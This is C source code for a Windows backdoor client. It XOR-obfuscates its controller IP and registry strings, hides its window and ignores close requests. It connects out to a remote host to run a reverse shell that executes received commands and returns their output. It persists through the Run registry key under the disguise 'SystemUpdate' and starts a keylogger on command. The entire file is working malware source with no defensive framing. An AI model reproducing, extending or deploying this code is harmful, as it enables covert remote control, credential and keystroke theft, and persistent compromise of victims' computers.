#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "keylogger.h"

#pragma comment(lib, "ws2_32.lib")

#define XOR_KEY 0x5A
#define MUTEX_NAME "Global\\UniqueBackdoorMutex"

char enc_ip[] = {0x31 ^ XOR_KEY, 0x39 ^ XOR_KEY, 0x32 ^ XOR_KEY, 0x2E ^ XOR_KEY,
                 0x31 ^ XOR_KEY, 0x36 ^ XOR_KEY, 0x38 ^ XOR_KEY, 0x2E ^ XOR_KEY,
                 0x32 ^ XOR_KEY, 0x33 ^ XOR_KEY, 0x2E ^ XOR_KEY, 0x31 ^ XOR_KEY,
                 0x33 ^ XOR_KEY, 0x30 ^ XOR_KEY, 0x00}; // "192.168.23.130"
char enc_reg_path[] = {0x48 ^ XOR_KEY, 0x4B ^ XOR_KEY, 0x45 ^ XOR_KEY, 0x59 ^ XOR_KEY,
                       0x5F ^ XOR_KEY, 0x43 ^ XOR_KEY, 0x55 ^ XOR_KEY, 0x52 ^ XOR_KEY,
                       0x52 ^ XOR_KEY, 0x45 ^ XOR_KEY, 0x4E ^ XOR_KEY, 0x54 ^ XOR_KEY,
                       0x5F ^ XOR_KEY, 0x55 ^ XOR_KEY, 0x53 ^ XOR_KEY, 0x45 ^ XOR_KEY,
                       0x52 ^ XOR_KEY, 0x5C ^ XOR_KEY, 0x53 ^ XOR_KEY, 0x6F ^ XOR_KEY,
                       0x66 ^ XOR_KEY, 0x74 ^ XOR_KEY, 0x77 ^ XOR_KEY, 0x61 ^ XOR_KEY,
                       0x72 ^ XOR_KEY, 0x65 ^ XOR_KEY, 0x5C ^ XOR_KEY, 0x4D ^ XOR_KEY,
                       0x69 ^ XOR_KEY, 0x63 ^ XOR_KEY, 0x72 ^ XOR_KEY, 0x6F ^ XOR_KEY,
                       0x73 ^ XOR_KEY, 0x6F ^ XOR_KEY, 0x66 ^ XOR_KEY, 0x74 ^ XOR_KEY,
                       0x5C ^ XOR_KEY, 0x57 ^ XOR_KEY, 0x69 ^ XOR_KEY, 0x6E ^ XOR_KEY,
                       0x64 ^ XOR_KEY, 0x6F ^ XOR_KEY, 0x77 ^ XOR_KEY, 0x73 ^ XOR_KEY,
                       0x5C ^ XOR_KEY, 0x43 ^ XOR_KEY, 0x75 ^ XOR_KEY, 0x72 ^ XOR_KEY,
                       0x72 ^ XOR_KEY, 0x65 ^ XOR_KEY, 0x6E ^ XOR_KEY, 0x74 ^ XOR_KEY,
                       0x56 ^ XOR_KEY, 0x65 ^ XOR_KEY, 0x72 ^ XOR_KEY, 0x73 ^ XOR_KEY,
                       0x69 ^ XOR_KEY, 0x6F ^ XOR_KEY, 0x6E ^ XOR_KEY, 0x5C ^ XOR_KEY,
                       0x52 ^ XOR_KEY, 0x75 ^ XOR_KEY, 0x6E ^ XOR_KEY, 0x00}; // HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
char enc_reg_value[] = {0x53 ^ XOR_KEY, 0x79 ^ XOR_KEY, 0x73 ^ XOR_KEY, 0x74 ^ XOR_KEY,
                        0x65 ^ XOR_KEY, 0x6D ^ XOR_KEY, 0x55 ^ XOR_KEY, 0x70 ^ XOR_KEY,
                        0x64 ^ XOR_KEY, 0x61 ^ XOR_KEY, 0x74 ^ XOR_KEY, 0x65 ^ XOR_KEY, 0x00}; // "SystemUpdate"
unsigned short enc_port = 50005 ^ XOR_KEY;

void decrypt_string(char* str, int len) {
    for (int i = 0; i < len && str[i] != 0; i++) {
        str[i] ^= XOR_KEY;
    }
}

int is_debugger_present() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &(BOOL){0});
}

int bootRun() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    char decrypted_reg_path[256];
    strcpy(decrypted_reg_path, enc_reg_path);
    decrypt_string(decrypted_reg_path, strlen(decrypted_reg_path));

    char decrypted_reg_value[32];
    strcpy(decrypted_reg_value, enc_reg_value);
    decrypt_string(decrypted_reg_value, strlen(decrypted_reg_value));

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, decrypted_reg_path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, decrypted_reg_value, 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        return 1;
    }
    return 0;
}

char* str_cut(char str[], int slice_from, int slice_to) {
    if (slice_to < 0 || slice_from > slice_to || strlen(str) < slice_to) {
        return NULL;
    }
    char* buffer = malloc(slice_to - slice_from + 1);
    if (!buffer) return NULL;
    strncpy(buffer, str + slice_from, slice_to - slice_from);
    buffer[slice_to - slice_from] = '\0';
    return buffer;
}

void Shell(int sock) {
    char buffer[1024];
    FILE *log = fopen("debug_shell.txt", "a");
    if (!log) {
        printf("Failed to open debug_shell.txt\n"); // Fallback if log fails
    }
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            if (log) fprintf(log, "Shell: Connection closed or error: %d\n", WSAGetLastError());
            break;
        }
        if (log) fprintf(log, "Shell: Received command: '%s', bytes: %d\n", buffer, bytes_received);

        if (strncmp(buffer, "q", 1) == 0) {
            if (log) fprintf(log, "Shell: Received quit command\n");
            closesocket(sock);
            WSACleanup();
            if (log) fclose(log);
            ExitProcess(0);
        }
        else if (strncmp(buffer, "cd ", 3) == 0) {
            char* dir = str_cut(buffer, 3, strlen(buffer));
            if (dir) {
                if (SetCurrentDirectoryA(dir)) {
                    if (log) fprintf(log, "Shell: Changed directory to %s\n", dir);
                } else {
                    if (log) fprintf(log, "Shell: Failed to change directory to %s\n", dir);
                    send(sock, "Directory change failed\n", 24, 0);
                }
                free(dir);
            }
        }
        else if (strcmp(buffer, "persist\n") == 0) {
            if (bootRun()) {
                if (log) fprintf(log, "Shell: Persistence added\n");
            } else {
                if (log) fprintf(log, "Shell: Persistence failed\n");
            }
        }
        else if (strcmp(buffer, "keylog_start\n") == 0) {
            if (log) fprintf(log, "Shell: Starting keylogger\n");
            CreateThread(NULL, 0, logg, NULL, 0, NULL);
        }
        else if (strcmp(buffer, "ls\n") == 0) {
            if (log) fprintf(log, "Shell: Command 'ls' not supported on Windows, use 'dir'\n");
            send(sock, "Command 'ls' not supported on Windows, use 'dir'\n", 44, 0);
        }
        else {
            FILE* fp;
            char output[1024];
            fp = _popen(buffer, "r");
            if (fp) {
                while (fgets(output, sizeof(output), fp)) {
                    send(sock, output, strlen(output), 0);
                }
                _pclose(fp);
                if (log) fprintf(log, "Shell: Command '%s' executed successfully\n", buffer);
            } else {
                if (log) fprintf(log, "Shell: _popen failed for command: '%s'\n", buffer);
                send(sock, "Command not recognized or failed\n", 33, 0);
            }
        }
    }
    if (log) fclose(log);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_CLOSE:
        case WM_DESTROY:
            // Ignore close and destroy messages to prevent termination
            return 0;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    FILE *log = fopen("debug.txt", "a");
    if (!log) {
        MessageBoxA(NULL, "Failed to create debug log", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    fprintf(log, "Starting client at %s\n", __TIME__);
    // Temporarily disabled anti-debugging for testing
    // if (is_debugger_present()) {
    //     fprintf(log, "Debugger detected, exiting\n");
    //     fclose(log);
    //     ExitProcess(1);
    // }

    // Ensure single instance using a mutex
    HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (log) fprintf(log, "Another instance is running, exiting\n");
        fclose(log);
        return 1;
    }

    // Set up a minimal window to handle messages
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "HiddenClient";
    RegisterClass(&wc);

    HWND hWnd = CreateWindow("HiddenClient", NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);
    ShowWindow(hWnd, SW_HIDE);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(log, "WSAStartup failed: %d\n", WSAGetLastError());
        fclose(log);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        fprintf(log, "Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        fclose(log);
        return 1;
    }

    char ip[16];
    strcpy(ip, enc_ip);
    decrypt_string(ip, strlen(ip));
    unsigned short port = enc_port ^ XOR_KEY;

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        fprintf(log, "Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        fclose(log);
        return 1;
    }

    fprintf(log, "Connected to server %s:%d\n", ip, port);
    fclose(log);

    bootRun();
    Shell(sock);

    // Cleanup
    closesocket(sock);
    WSACleanup();
    UnregisterClass("HiddenClient", hInstance);
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    return 0;
}